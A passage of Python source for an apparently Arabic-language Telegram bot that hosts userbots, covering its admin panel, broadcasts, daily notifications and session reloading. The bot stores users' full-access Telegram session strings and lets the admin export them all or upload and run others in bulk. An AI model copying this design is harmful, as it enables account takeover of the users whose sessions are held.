        [Button.inline("🩺 Health Check", b"health_check")],
        [Button.inline("📢 إذاعة عامة", b"broadcast"), Button.inline("🔙 رجوع", b"back")]
    ]
    
    await event.edit(
        f"👑 **مـرحـبـاً سـيـدي الـمـطـور فـي لـوحـة الإدارة**\n\n"
        f"📊 **عـدد الـمـسـتـخـدمـيـن حـالـيـاً :** `{len(db)}` \n"
        f"📱 **إجمالي التنصيبات :** `{total_installs}` \n"
        f"📁 ملاحظة: ملف النسخ الاحتياطي يشمل كافة إعدادات المستخدمين.", 
        buttons=btns
    )


# --- معالج الإحصائيات ---
@bot.on(events.CallbackQuery(data=b"statistics"))
async def statistics(event):
    if event.sender_id != ADMIN_ID: return
    
    db = get_db()
    total_installs = sum(len(installs) for installs in db.values())
    
    # إحصائيات أكثر تفصيلاً
    users_with_multiple = sum(1 for installs in db.values() if len(installs) > 1)
    
    stats_text = (
        f"📊 **إحصائيات السورس:**\n\n"
        f"👤 **إجمالي المستخدمين:** `{len(db)}`\n"
        f"📱 **إجمالي التنصيبات:** `{total_installs}`\n"
        f"🔄 **المستخدمين المتعددين:** `{users_with_multiple}`\n"
        f"⚡ **التنصيبات النشطة:** `{len(running_tasks)}`\n"
        f"📅 **اليوم:** `{datetime.datetime.now().strftime('%Y-%m-%d')}`"
    )
    
    await event.edit(stats_text, buttons=[Button.inline("🔙 رجوع", b"admin_panel")])


# --- معالج Health Check (زر بدلاً من أمر) ---
@bot.on(events.CallbackQuery(data=b"health_check"))
async def health_check(event):
    if event.sender_id != ADMIN_ID: return
    
    db = get_db()
    total_installs = sum(len(installs) for installs in db.values())
    
    health_text = (
        f"🩺 **Health Check Report**\n\n"
        f"💓 **الحالة:** البوت يعمل بشكل طبيعي\n"
        f"👥 **المستخدمون:** `{len(db)}`\n"
        f"📱 **التنصيبات:** `{total_installs}`\n"
        f"⚡ **السورسات النشطة:** `{len(running_tasks)}`\n"
        f"📊 **Rate Limiting:** `{len(user_last_action)}` مستخدمين نشطين\n"
        f"🕐 **الوقت:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        f"📝 **السجلات:** آخر تحديث في log file"
    )
    
    await event.edit(health_text, buttons=[Button.inline("🔙 رجوع", b"admin_panel")])


# --- وظائف التحكم الإدارية ---
@bot.on(events.CallbackQuery(data=b"toggle_lock"))
async def toggle_lock(event):
    if event.sender_id != ADMIN_ID: return
    settings = load_settings()
    settings['setup_locked'] = not settings.get('setup_locked', False)
    save_settings(settings)
    logger.info(f"تغيير حالة قفل التنصيب: {settings['setup_locked']}")
    await admin_panel(event)


@bot.on(events.CallbackQuery(data=b"get_backup"))
async def get_backup(event):
    if event.sender_id != ADMIN_ID: return
    if os.path.exists(DB_FILE):
        await bot.send_file(event.chat_id, DB_FILE, caption=f"📁 نسخة احتياطية كاملة (تشمل الإعدادات) بتاريخ: {datetime.datetime.now()}")
        logger.info(f"تم سحب نسخة احتياطية بواسطة المطور")
    else:
        await event.answer("⚠️ لا يوجد ملف قاعدة بيانات حالياً.", alert=True)


@bot.on(events.CallbackQuery(data=b"upload_backup"))
async def upload_backup(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📤 **أرسـل الآن مـلـف `database.json` لـتـحـديـث الـقـاعدة :**")
        msg = await conv.get_response()
        if not (msg.file and msg.file.name.endswith(".json")):
            return await conv.send_message("❌ **خـطأ: يـرجـى إرسـل مـلـف JSON صـحـيـح.**")

        temp_file = "temp_uploaded_db.json"
        await bot.download_media(msg, temp_file)

        try:
            with open(temp_file, 'r', encoding='utf-8') as f:
                uploaded_data = json.load(f)
        except Exception as e:
            os.remove(temp_file)
            return await conv.send_message(f"❌ **خـطأ في قراءة الملف:**\n`{str(e)}`")

        db = get_db()
        added = 0
        failed = 0
        report_lines = []

        # نتكرر على كل مستخدم وتنصيباته
        for uid_str, user_installs in uploaded_data.items():
            if not isinstance(user_installs, list):
                user_installs = [user_installs]

            for install in user_installs:
                session_str = install.get("session", "")
                api_id = install.get("api_id", API_ID)
                api_hash = install.get("api_hash", API_HASH)
                name = install.get("name", "Unknown")

                # التحقق من صلاحية الجلسة فوراً
                try:
                    temp = TelegramClient(StringSession(session_str), api_id, api_hash)
                    await temp.connect()
                    if not await temp.is_user_authorized():
                        raise ValueError("Invalid session")
                    await temp.disconnect()
                except Exception as e:
                    failed += 1
                    report_lines.append(f"❌ {name} (`{uid_str}`) – السبب: {str(e)[:60]}")
                    continue

                # الجلسة صالحة، نحفظ التنصيب
                if uid_str not in db:
                    db[uid_str] = []
                install_index = len(db[uid_str])
                db[uid_str].append(install)
                save_db(db)
                added += 1
                report_lines.append(f"✅ {name} (`{uid_str}`)")

                # نخزن فقط، لا نشغل
                pending_sessions.append((int(uid_str), install_index, install))
                await asyncio.sleep(0.3)  # تخفيف الضغط

        os.remove(temp_file)

        # إضافة زر لتشغيلهم لاحقاً
        from telethon import Button
        await conv.send_message(
            f"✅ **اكتمل فحص ورفع النسخة الاحتياطية:**\n\n"
            f"📊 **النتائج:**\n"
            f"• التنصيبات المضافة والمشغلة: `{added}`\n"
            f"• التنصيبات الفاسدة المحذوفة: `{failed}`\n"
            f"• إجمالي المستخدمين الآن: `{len(db)}`\n\n"
            "**التفاصيل:**\n" + "\n".join(report_lines[:30])  # لا نرسل أكثر من 30 سطر
            + "\n\n📌 التنصيبات مخزّنة، اضغط الزر أدناه متى ما أردت تشغيلهم.",
            buttons=[Button.inline("▶️ تشغيل التنصيبات المرفوعة", b"run_pending")]
        )
        logger.info(f"رفع نسخة احتياطية: {added} صالحة، {failed} فاسدة.")


@bot.on(events.CallbackQuery(data=b"run_pending"))
async def run_pending(event):
    if event.sender_id != ADMIN_ID:
        return await event.answer("⚠️ عذراً، هذا الزر للمطور فقط.", alert=True)

    if not pending_sessions:
        return await event.answer("⚠️ لا توجد تنصيبات معلّقة حالياً.", alert=True)

    count = 0
    for uid, idx, info in pending_sessions:
        try:
            asyncio.create_task(
                run_user_safely(info['session'],
                                info.get('api_id', API_ID),
                                info.get('api_hash', API_HASH),
                                info, uid, idx)
            )
            count += 1
            await asyncio.sleep(0.3)
        except Exception as e:
            logger.error(f"فشل تشغيل تنصيب {uid} رقم {idx}: {e}")

    pending_sessions.clear()
    await event.answer(f"✅ تم تشغيل {count} تنصيب بنجاح!", alert=True)
    logger.info(f"المطور شغّل {count} تنصيب يدوياً.")


@bot.on(events.CallbackQuery(data=b"block_user"))
async def block_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("🚫 **أرسـل ايـدي الـمـسـتـخـدم لـحـظـره :**")
        res = await conv.get_response()
        try:
            target = int(res.text)
            settings = load_settings()
            if target not in settings['blacklist']:
                settings['blacklist'].append(target)
            save_settings(settings)
            logger.info(f"تم حظر المستخدم {target}")
            await conv.send_message(f"✅ تم حظر `{target}` بنجاح.")
        except:
            await conv.send_message("❌ الايدي غير صحيح.")


@bot.on(events.CallbackQuery(data=b"unblock_user"))
async def unblock_user(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("✅ **أرسـل ايـدي الـمـسـتـخـدم لإلـغـاء حـظـره :**")
        res = await conv.get_response()
        try:
            target = int(res.text)
            settings = load_settings()
            if target in settings['blacklist']:
                settings['blacklist'].remove(target)
            save_settings(settings)
            logger.info(f"تم إلغاء حظر المستخدم {target}")
            await conv.send_message(f"✅ تم إلغاء حظر `{target}`.")
        except:
            await conv.send_message("❌ الايدي غير صحيح.")


@bot.on(events.CallbackQuery(data=b"broadcast"))
async def broadcast(event):
    if event.sender_id != ADMIN_ID: return
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📢 **أرسـل نـص الإذاعـة الآن :**")
        msg = await conv.get_response()
        db = get_db()
        sent = 0
        failed = 0
        await conv.send_message("⏳ جاري الإرسال للجميع...")
        for uid in db:
            try:
                await bot.send_message(int(uid), msg.text)
                sent += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                failed += 1
                logger.error(f"فشل إرسال إذاعة للمستخدم {uid}: {e}")
        await conv.send_message(f"✅ تم إرسال الإذاعة إلى {sent} مستخدم.\n❌ فشل: {failed}")
        logger.info(f"إذاعة تم إرسالها: {sent} ناجح، {failed} فشل")


@bot.on(events.CallbackQuery(data=b"back"))
async def back(event):
    await start(event)


# --- مهمة الإشعارات الدورية (تعمل كل 24 ساعة) ---
async def daily_notifications():
    """مهمة خلفية ترسل إشعارات يومية للمستخدمين"""
    while True:
        try:
            db = get_db()
            logger.info("بدء مهمة الإشعارات الدورية...")
            
            for uid, installs in db.items():
                for idx, install in enumerate(installs):
                    # التحقق إذا كان المستخدم يريد الإشعارات
                    if install.get('custom_settings', {}).get('daily_notifications', True):
                        try:
                            await bot.send_message(
                                int(uid), 
                                "✅ **تقرير يومي:** سورسك يعمل بشكل طبيعي!\n\n"
                                f"📅 **التاريخ:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
                                f"📱 **التنصيب:** `{install['name']}`",
                                buttons=[Button.inline("📋 عرض التنصيباتي", b"my_installs")]
                            )
                            logger.info(f"تم إرسال إشعار للمستخدم {uid} - التنصيب {idx + 1}")
                        except Exception as e:
                            logger.error(f"فشل إرسال إشعار للمستخدم {uid}: {e}")
                        await asyncio.sleep(0.5)
            
            logger.info("تم إرسال جميع الإشعارات اليومية بنجاح")
        except Exception as e:
            logger.error(f"خطأ في الإشعارات اليومية: {e}")
        
        # انتظار 24 ساعة قبل الإرسال مرة أخرى (86400 ثانية)
        await asyncio.sleep(86400)


# --- وظيفة تشغيل كافة الجلسات والبوتات المخزنة عند الإقلاع ---
async def load_backup():
    """تشغيل جميع السيشنات المخزنة عند بدء البوت مع التحقق من صحتها"""
    try:
        db = get_db()
        if not db:
            return
        total = sum(len(installs) for installs in db.values())
        logger.info(f"جاري فحص {total} جلسة...")
        valid_count = 0
        for uid, installs in list(db.items()):  # list لأننا قد نحذف أثناء التكرار
            for idx, info in enumerate(list(installs)):
                if "session" not in info:
                    continue
                try:
                    temp = TelegramClient(StringSession(info['session']), info.get('api_id', API_ID), info.get('api_hash', API_HASH))
                    await temp.connect()
                    if not await temp.is_user_authorized():
                        raise ValueError("Invalid session")
                    await temp.disconnect()
                    # الجلسة صالحة، نشغّلها
                    asyncio.create_task(run_user_safely(info['session'], info.get('api_id', API_ID), info.get('api_hash', API_HASH), info, int(uid), idx))
                    valid_count += 1
                    await asyncio.sleep(0.01)
                except Exception as e:
                    # حذف التنصيب الفاسد
                    del db[uid][idx]
                    if not db[uid]:
                        del db[uid]
                    logger.warning(f"تم حذف تنصيب فاسد للمستخدم {uid}: {e}")
        save_db(db)
        logger.info(f"تم تشغيل {valid_count} جلسة صالحة، وحذف الباقي.")
    except Exception as e:
        logger.error(f"خطأ في فحص النسخة الاحتياطية: {e}")


# --- نقطة انطلاق النظام ---
if __name__ == "__main__":
    logger.info("🤖 RECO SOURCE SYSTEM IS STARTING...")
    bot.loop.create_task(load_backup())
    bot.loop.create_task(daily_notifications())  # بدء مهمة الإشعارات الدورية
    bot.run_until_disconnected()
